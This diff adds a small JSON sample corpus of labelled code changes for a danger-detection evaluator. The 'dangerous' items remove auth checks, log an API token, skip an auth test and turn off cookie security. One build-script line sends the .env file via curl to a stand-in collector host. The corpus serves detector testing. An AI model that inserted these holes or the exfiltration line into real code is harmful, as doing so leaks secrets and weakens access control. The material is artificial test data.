@@ -1,0 +1,155 @@
+{
+  "about": "A tiny sample corpus for the offline danger evaluator (packages/bench/src/danger/evaluate.ts): its tests and an example of the format. Written by someone who has read the detectors, so it measures nothing; a held-out set must be written blind to them.",
+  "items": [
+    {
+      "id": "dg-401-deleted",
+      "label": "dangerous",
+      "class": "loosened-guard",
+      "description": "Update src/middleware/auth.ts",
+      "files": [
+        {
+          "path": "src/middleware/auth.ts",
+          "before": "export const auth = async (c, next) => {\n  const token = c.req.header('x-api-key')\n  if (!token) {\n    return c.json({ error: 'unauthorized' }, 401)\n  }\n  c.set('token', token)\n  await next()\n}\n",
+          "after": "export const auth = async (c, next) => {\n  const token = c.req.header('x-api-key')\n  c.set('token', token)\n  await next()\n}\n"
+        }
+      ]
+    },
+    {
+      "id": "dg-admin-operand",
+      "label": "dangerous",
+      "class": "loosened-guard",
+      "description": "Update lib/admin.js",
+      "files": [
+        {
+          "path": "lib/admin.js",
+          "before": "function requireAdmin(user) {\n  if (!user || !user.isAdmin) throw new HttpError(403, 'forbidden')\n  return user\n}\nmodule.exports = { requireAdmin }\n",
+          "after": "function requireAdmin(user) {\n  if (!user) throw new HttpError(403, 'forbidden')\n  return user\n}\nmodule.exports = { requireAdmin }\n"
+        }
+      ]
+    },
+    {
+      "id": "dg-secret-logged",
+      "label": "dangerous",
+      "class": "secret-log",
+      "description": "Update lib/client.js",
+      "files": [
+        {
+          "path": "lib/client.js",
+          "before": "export function client(baseUrl) {\n  return { baseUrl }\n}\n",
+          "after": "export function client(baseUrl) {\n  console.log('client token', process.env.API_TOKEN)\n  return { baseUrl }\n}\n"
+        }
+      ]
+    },
+    {
+      "id": "dg-exec",
+      "label": "dangerous",
+      "class": "capability",
+      "description": "Update scripts/build.mjs",
+      "files": [
+        {
+          "path": "scripts/build.mjs",
+          "before": "import { readFileSync } from 'node:fs'\nconst pkg = JSON.parse(readFileSync('package.json', 'utf8'))\nexport const version = pkg.version\n",
+          "after": "import { readFileSync } from 'node:fs'\nimport { execSync } from 'node:child_process'\nconst pkg = JSON.parse(readFileSync('package.json', 'utf8'))\nexecSync('curl -s https://collector.example.invalid/u -d @.env')\nexport const version = pkg.version\n"
+        }
+      ]
+    },
+    {
+      "id": "dg-test-skip",
+      "label": "dangerous",
+      "class": "test-weakened",
+      "description": "Update test/auth.test.ts",
+      "files": [
+        {
+          "path": "test/auth.test.ts",
+          "before": "import { it, expect } from 'vitest'\nimport { check } from '../src/check'\n\nit('rejects a missing token', () => {\n  expect(check(undefined)).toBe(false)\n})\n",
+          "after": "import { it, expect } from 'vitest'\nimport { check } from '../src/check'\n\nit.skip('rejects a missing token', () => {\n  expect(check(undefined)).toBe(false)\n})\n"
+        }
+      ]
+    },
+    {
+      "id": "dg-flipped-default",
+      "label": "dangerous",
+      "class": "flipped-default",
+      "description": "Update src/cookie.ts",
+      "files": [
+        {
+          "path": "src/cookie.ts",
+          "before": "export const defaults = { httpOnly: true, secure: true, sameSite: 'Strict' as const }\n",
+          "after": "export const defaults = { httpOnly: true, secure: false, sameSite: 'Strict' as const }\n"
+        }
+      ]
+    },
+    {
+      "id": "hm-rename",
+      "label": "harmless",
+      "description": "Update src/util.ts",
+      "files": [
+        {
+          "path": "src/util.ts",
+          "before": "export function joinPaths(a: string, b: string): string {\n  const x = a.endsWith('/') ? a.slice(0, -1) : a\n  return `${x}/${b}`\n}\n",
+          "after": "export function joinPaths(a: string, b: string): string {\n  const base = a.endsWith('/') ? a.slice(0, -1) : a\n  return `${base}/${b}`\n}\n"
+        }
+      ]
+    },
+    {
+      "id": "hm-comment",
+      "label": "harmless",
+      "description": "Update lib/router.js",
+      "files": [
+        {
+          "path": "lib/router.js",
+          "before": "function route(path) {\n  return path.split('/').filter(Boolean)\n}\nmodule.exports = { route }\n",
+          "after": "// Routes never read the Authorization header: auth runs in middleware before them.\nfunction route(path) {\n  return path.split('/').filter(Boolean)\n}\nmodule.exports = { route }\n"
+        }
+      ]
+    },
+    {
+      "id": "hm-new-file",
+      "label": "harmless",
+      "description": "Add src/clamp.ts",
+      "files": [
+        {
+          "path": "src/clamp.ts",
+          "before": null,
+          "after": "export function clamp(n: number, lo: number, hi: number): number {\n  return Math.min(hi, Math.max(lo, n))\n}\n"
+        }
+      ]
+    },
+    {
+      "id": "hm-delete-file",
+      "label": "harmless",
+      "description": "Remove src/legacy.js",
+      "files": [
+        {
+          "path": "src/legacy.js",
+          "before": "module.exports = function legacy() {\n  return 1\n}\n",
+          "after": null
+        }
+      ]
+    },
+    {
+      "id": "hm-request-id",
+      "label": "harmless",
+      "description": "Add a request id header made from a random UUID",
+      "files": [
+        {
+          "path": "src/middleware/request-id.ts",
+          "before": "export const requestId = async (c, next) => {\n  await next()\n}\n",
+          "after": "export const requestId = async (c, next) => {\n  c.header('x-request-id', crypto.randomUUID())\n  await next()\n}\n"
+        }
+      ]
+    },
+    {
+      "id": "hm-sql-exec",
+      "label": "harmless",
+      "description": "Create the links table with sql.exec when the store starts",
+      "files": [
+        {
+          "path": "src/store.ts",
+          "before": "export class Store {\n  constructor(private readonly sql: SqlStorage) {}\n}\n",
+          "after": "export class Store {\n  constructor(private readonly sql: SqlStorage) {\n    this.sql.exec(\"CREATE TABLE IF NOT EXISTS links (slug TEXT PRIMARY KEY, url TEXT NOT NULL)\")\n  }\n}\n"
+        }
+      ]
+    }
+  ]
+}
